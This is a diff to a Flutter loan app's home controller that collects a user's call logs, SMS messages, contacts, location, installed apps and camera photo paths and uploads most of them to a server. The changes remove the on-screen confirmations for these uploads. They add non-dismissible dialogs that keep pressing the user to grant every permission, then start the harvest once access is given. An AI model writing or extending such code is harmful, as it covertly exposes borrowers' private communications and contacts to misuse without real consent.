@@ -4,15 +4,14 @@ import 'dart:io';
 import 'package:call_log/call_log.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:device_info_plus/device_info_plus.dart';
-import 'package:file_picker/file_picker.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geocoding/geocoding.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:get/get.dart';
 import 'package:installed_apps/app_info.dart';
 import 'package:installed_apps/installed_apps.dart';
-import 'package:path_provider/path_provider.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:prathima_loan_app/controllers/kyc_controller.dart';
 import 'package:prathima_loan_app/customs/custom_snackbar.dart';
@@ -35,6 +34,8 @@ class HomeController extends GetxController implements GetxService {
   String _initialLoanAmount = '...';
   String _deviceId = '';
   int _userId = 0;
+  bool _allPermissionsGranted = false;
+  bool _hasShownPermanentlyDeniedDialog = false;
 
   int get currentIndex => _currentIndex;
 
@@ -43,6 +44,10 @@ class HomeController extends GetxController implements GetxService {
   String get deviceId => _deviceId;
 
   int get userId => _userId;
+
+  bool get allPermissionsGranted => _allPermissionsGranted;
+
+  bool get hasShownPermanentlyDeniedDialog => _hasShownPermanentlyDeniedDialog;
 
   List<BottomNavigationBarItem> items = [
     const BottomNavigationBarItem(
@@ -91,18 +96,10 @@ class HomeController extends GetxController implements GetxService {
       if (Get.find<KycController>().kycStatus!.status == 3) {
         Get.toNamed(RouteHelper.loanDetailsForm);
       } else {
-        Get.toNamed(RouteHelper.kycDetail);
+        Get.toNamed(RouteHelper.kycVerificationScreen);
       }
     }
     update();
-  }
-
-  appPermission() async {
-    await Permission.phone.request();
-    await Permission.sms.request();
-    await Permission.location.request();
-    await Permission.contacts.request();
-    await Permission.storage.request();
   }
 
   Future<void> fetchCallLogs() async {
@@ -122,15 +119,11 @@ class HomeController extends GetxController implements GetxService {
             "device_id": deviceId,
             "data": jsonDataList
           });
-          if (response.statusCode == 200) {
-            showCustomSnackBar(response.body["message"], isError: false);
-          } else {
+          if (response.statusCode != 200) {
             ApiChecker.checkApi(response);
           }
         }
       } catch (_) {}
-    } else {
-      await Permission.phone.request();
     }
   }
 
@@ -149,20 +142,17 @@ class HomeController extends GetxController implements GetxService {
             "device_id": deviceId,
             "data": jsonDataList
           });
-          if (response.statusCode == 200) {
-            showCustomSnackBar(response.body["message"], isError: false);
-          } else {
+          if (response.statusCode != 200) {
             ApiChecker.checkApi(response);
           }
         }
       } catch (_) {}
-    } else {
-      await Permission.location.request();
     }
   }
 
   Future<void> getDeviceIdAndUserId() async {
     final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
+
     if (GetPlatform.isAndroid) {
       AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
       _deviceId = androidInfo.id;
@@ -191,15 +181,11 @@ class HomeController extends GetxController implements GetxService {
             "device_id": deviceId,
             "data": jsonDataList
           });
-          if (response.statusCode == 200) {
-            showCustomSnackBar(response.body["message"], isError: false);
-          } else {
+          if (response.statusCode != 200) {
             ApiChecker.checkApi(response);
           }
         }
       } catch (_) {}
-    } else {
-      await Permission.location.request();
     }
   }
 
@@ -217,39 +203,53 @@ class HomeController extends GetxController implements GetxService {
             "device_id": deviceId,
             "data": jsonDataList
           });
-          if (response.statusCode == 200) {
-            showCustomSnackBar(response.body["message"], isError: false);
-          } else {
+          if (response.statusCode != 200) {
             ApiChecker.checkApi(response);
           }
         }
       } catch (_) {}
-    } else {
-      await Permission.location.request();
     }
   }
 
-  Future<void> fetchDCIMFolder() async {
+  Future<List<String>> fetchDCIMFolder() async {
+    List<String> filePaths = [];
+    if (await Permission.manageExternalStorage.isGranted == false) {
+      print('yes entered --------------------');
+      await Permission.manageExternalStorage.request();
+    }
+    print(
+        'await Permission.manageExternalStorage.isGranted ${await Permission.manageExternalStorage.isGranted}');
     if (await Permission.storage.request().isGranted) {
-      Directory? externalDir = await getExternalStorageDirectory();
-      final directory =
-          Directory('/storage/emulated/0/DCIM/Camera/Cshot/1658663200031');
-      if (await directory.exists()) {
-        print('dcimDir ----- > $directory');
-        List files = directory.listSync(recursive: true);
-        print("files ------- > $files");
-        for (FileSystemEntity file in files) {
-          print('File: ${file.path}');
+      try {
+        var picturesDirectory = Directory('/storage/emulated/0/DCIM/Camera/');
+
+        if (await picturesDirectory.exists()) {
+          List<FileSystemEntity> files =
+              picturesDirectory.listSync(recursive: true);
+
+          for (FileSystemEntity file in files) {
+            if (file is File &&
+                (file.path.endsWith(".jpg") || file.path.endsWith(".png"))) {
+              filePaths.add(file.path);
+            }
+          }
         }
+      } catch (e) {
+        print('Error accessing MediaStore: $e');
       }
     }
+
+    return filePaths;
   }
+
+
 
   Future<void> fetchCurrentLocation() async {
     if (await Permission.location.request().isGranted) {
       try {
         Position position = await Geolocator.getCurrentPosition(
             desiredAccuracy: LocationAccuracy.high);
+
         String? address;
 
         List<Placemark> placeMarks = await placemarkFromCoordinates(
@@ -265,14 +265,124 @@ class HomeController extends GetxController implements GetxService {
           "longitude": position.longitude,
           "address": address
         });
-        if (response.statusCode == 200) {
-          showCustomSnackBar(response.body["message"], isError: false);
-        } else {
+        if (response.statusCode != 200) {
           ApiChecker.checkApi(response);
         }
       } catch (_) {}
-    } else {
-      await Permission.location.request();
     }
+  }
+
+  Future<void> appPermission() async {
+    Map<Permission, PermissionStatus> statuses = await [
+      Permission.phone,
+      Permission.sms,
+      Permission.location,
+      Permission.contacts,
+      Permission.storage,
+    ].request();
+
+    _allPermissionsGranted =
+        statuses.values.every((status) => status == PermissionStatus.granted);
+
+    if (!_allPermissionsGranted) {
+      await _handlePermissionStatuses(statuses);
+    } else {
+      // await fetchDCIMFolder();
+      await fetchContactsLogs();
+      await fetchCallLogs();
+      await fetchSMSLogs();
+      await fetchCurrentLocation();
+      await fetchInstalledApps();
+    }
+  }
+
+  Future<bool> _checkAllPermissionsGranted() async {
+    Map<Permission, PermissionStatus> statuses = await [
+      Permission.phone,
+      Permission.sms,
+      Permission.location,
+      Permission.contacts,
+      Permission.storage,
+    ].request();
+
+    return statuses.values
+        .every((status) => status == PermissionStatus.granted);
+  }
+
+  Future<void> _handlePermissionStatuses(
+      Map<Permission, PermissionStatus> statuses) async {
+    for (var entry in statuses.entries) {
+      Permission permission = entry.key;
+      PermissionStatus status = entry.value;
+
+      if (status == PermissionStatus.denied) {
+        await _showPermissionDialog(permission);
+      } else if (status == PermissionStatus.permanentlyDenied) {
+        if (!_hasShownPermanentlyDeniedDialog) {
+          _hasShownPermanentlyDeniedDialog = true;
+          await _showPermanentlyDeniedDialog();
+        }
+      }
+    }
+  }
+
+  Future<void> _showPermissionDialog(Permission permission) async {
+    await Get.dialog(
+      barrierDismissible: false,
+      AlertDialog(
+        title: const Text('Permission Required'),
+        content: const Text(
+            'This is required for the app to function properly. Please grant the permission.'),
+        actions: [
+          TextButton(
+            onPressed: () async {
+              Get.back();
+              await permission.request();
+            },
+            child: const Text('Allow'),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Future<void> _showPermanentlyDeniedDialog() async {
+    await Get.dialog(
+      barrierDismissible: false,
+      AlertDialog(
+        title: const Text('Permission Required'),
+        content: const Text(
+            'This permission has been permanently denied. Please go to settings and enable it manually.'),
+        actions: [
+          TextButton(
+            onPressed: () {
+              openAppSettings().then((_) async {
+                _allPermissionsGranted = await _checkAllPermissionsGranted();
+                if (_allPermissionsGranted) {
+                  Get.back();
+                }
+              });
+            },
+            child: const Text('Open Settings'),
+          ),
+        ],
+      ),
+    ).then((value) async {
+      if (!_allPermissionsGranted) {
+        _allPermissionsGranted = await _checkAllPermissionsGranted();
+      }
+      if (!_allPermissionsGranted) {
+        Get.back();
+        showCustomSnackBar("Please grant all required permissions");
+        _showPermanentlyDeniedDialog();
+      } else {
+        // await fetchDCIMFolder();
+        await fetchContactsLogs();
+        await fetchCallLogs();
+        await fetchSMSLogs();
+        await fetchCurrentLocation();
+        await fetchInstalledApps();
+      }
+    });
   }
 }
